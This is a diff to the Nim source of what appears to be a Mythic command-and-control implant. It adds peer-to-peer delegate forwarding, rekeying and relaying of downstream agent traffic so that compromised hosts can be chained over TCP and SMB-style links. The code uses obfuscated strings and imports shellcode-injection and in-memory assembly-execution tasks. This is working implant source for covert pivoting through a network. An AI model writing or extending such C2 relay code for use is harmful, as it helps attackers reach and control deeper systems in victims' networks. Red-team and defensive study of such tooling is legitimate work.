@@ -6,9 +6,11 @@ import ../utils/strenc
 import ../utils/task_processor
 import ../tasks/download
 import ../tasks/upload
+import ../tasks/connect
 
 # Import Windows-specific tasks for chunk processing
 when defined(windows):
+  import ../tasks/link
   import ../tasks/execute_assembly
   import ../tasks/inline_execute
   import ../tasks/shinject
@@ -231,6 +233,58 @@ proc receiveUploadChunk(taskId: string, params: JsonNode, fileData: var seq[byte
       obf("user_output"): "Error processing upload chunk: " & e.msg
     }
 
+proc forwardIncomingDelegates*(msgJson: JsonNode) =
+  ## Forward any incoming delegates from a message to downstream P2P agents
+  ## This enables multi-level P2P chaining (e.g., HTTP <- TCP <- SMB)
+  if msgJson.hasKey(obf("delegates")):
+    let delegates = msgJson[obf("delegates")]
+    for delegate in delegates:
+      if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
+        let delegateUuid = delegate[obf("uuid")].getStr()
+        let delegateMsg = delegate[obf("message")].getStr()
+        debug "[DEBUG] TCP P2P: Forwarding delegate to downstream agent ", delegateUuid
+        discard forwardDelegateToConnect(delegateUuid, delegateMsg)
+        when defined(windows):
+          discard forwardDelegateToLink(delegateUuid, delegateMsg)
+        # Handle rekeying if Mythic assigned a new UUID
+        if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
+          let newUuid = if delegate.hasKey(obf("new_uuid")):
+            delegate[obf("new_uuid")].getStr()
+          else:
+            delegate[obf("mythic_uuid")].getStr()
+          if newUuid != delegateUuid:
+            debug "[DEBUG] TCP P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
+            discard rekeyConnectConnection(delegateUuid, newUuid)
+            when defined(windows):
+              discard rekeyLinkConnection(delegateUuid, newUuid)
+
+proc collectDownstreamDelegates*(): tuple[delegates: JsonNode, edges: JsonNode] =
+  ## Collect delegate and edge data from all downstream P2P connections
+  ## Used by P2P profile agents to relay data from further-downstream agents
+  var delegates = newJArray()
+  var edges = newJArray()
+  
+  let connectResps = checkActiveConnectConnections()
+  for resp in connectResps:
+    if resp.hasKey(obf("delegates")):
+      for d in resp[obf("delegates")]:
+        delegates.add(d)
+    elif resp.hasKey(obf("edges")):
+      for e in resp[obf("edges")]:
+        edges.add(e)
+  
+  when defined(windows):
+    let linkResps = checkActiveLinkConnections()
+    for resp in linkResps:
+      if resp.hasKey(obf("delegates")):
+        for d in resp[obf("delegates")]:
+          delegates.add(d)
+      elif resp.hasKey(obf("edges")):
+        for e in resp[obf("edges")]:
+          edges.add(e)
+  
+  return (delegates, edges)
+
 proc startListening*(profile: TcpProfile): Future[void] {.async.} =
   ## Start listening for P2P connections
   if profile.listening:
@@ -329,6 +383,9 @@ proc start*(profile: TcpProfile) {.async.} =
           try:
             let msgJson = parseJson(decrypted)
             debug "[DEBUG] TCP P2P: Parsed JSON, checking for action or responses..."
+            
+            # Forward any incoming delegates to downstream P2P agents (multi-level P2P support)
+            forwardIncomingDelegates(msgJson)
             
             # Check for responses array (post_response from Mythic)
             if msgJson.hasKey(obf("responses")):
@@ -518,17 +575,36 @@ proc start*(profile: TcpProfile) {.async.} =
               
               # If we have chunks to send, send them now
               if chunksToSend.len > 0:
+                # Collect downstream delegate data (multi-level P2P)
+                let (downDelegates, downEdges) = collectDownstreamDelegates()
+                for e in downEdges:
+                  chunksToSend.add(e)
+                
                 let chunkResponse = %* {
                   obf("action"): obf("post_response"),
                   obf("responses"): chunksToSend
                 }
+                if downDelegates.len > 0:
+                  chunkResponse[obf("delegates")] = downDelegates
+                  debug "[DEBUG] TCP P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
                 
                 debug "[DEBUG] TCP P2P: Sending ", chunksToSend.len, " download chunk(s)"
                 let responseEncrypted = profile.encryptMessage($chunkResponse, profile.callbackUuid)
                 await sendChunkedMessage(client, responseEncrypted)
                 continue
               
-              # No chunks to send - just continue
+              # No chunks to send - check if there's downstream delegate data to relay
+              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegates()
+              if noChunkDelegates.len > 0 or noChunkEdges.len > 0:
+                let delegateResponse = %* {
+                  obf("action"): obf("post_response"),
+                  obf("responses"): noChunkEdges
+                }
+                if noChunkDelegates.len > 0:
+                  delegateResponse[obf("delegates")] = noChunkDelegates
+                  debug "[DEBUG] TCP P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
+                let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+                await sendChunkedMessage(client, responseEncrypted)
               continue
             
             # Check for action field
@@ -720,11 +796,19 @@ proc start*(profile: TcpProfile) {.async.} =
                       else:
                         taskResponses.add(execResult.response)
                     
+                    # Collect downstream delegate data (multi-level P2P)
+                    let (taskDelegates, taskEdges) = collectDownstreamDelegates()
+                    for e in taskEdges:
+                      taskResponses.add(e)
+                    
                     # Send response with task results
                     let taskingResponse = %* {
                       obf("action"): obf("post_response"),
                       obf("responses"): taskResponses
                     }
+                    if taskDelegates.len > 0:
+                      taskingResponse[obf("delegates")] = taskDelegates
+                      debug "[DEBUG] TCP P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                     
                     debug "[DEBUG] TCP P2P: Sending ", taskResponses.len, " task response(s)"
                     let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
@@ -738,7 +822,18 @@ proc start*(profile: TcpProfile) {.async.} =
                       break
                 else:
                   debug "[DEBUG] TCP P2P: No tasks in get_tasking response"
-                  # No tasks = no response needed, just continue
+                  # Even without tasks, check for downstream delegate data to relay
+                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegates()
+                  if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
+                    let delegateResponse = %* {
+                      obf("action"): obf("post_response"),
+                      obf("responses"): noTaskEdges
+                    }
+                    if noTaskDelegates.len > 0:
+                      delegateResponse[obf("delegates")] = noTaskDelegates
+                      debug "[DEBUG] TCP P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
+                    let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+                    await sendChunkedMessage(client, responseEncrypted)
                   continue
           except:
             discard
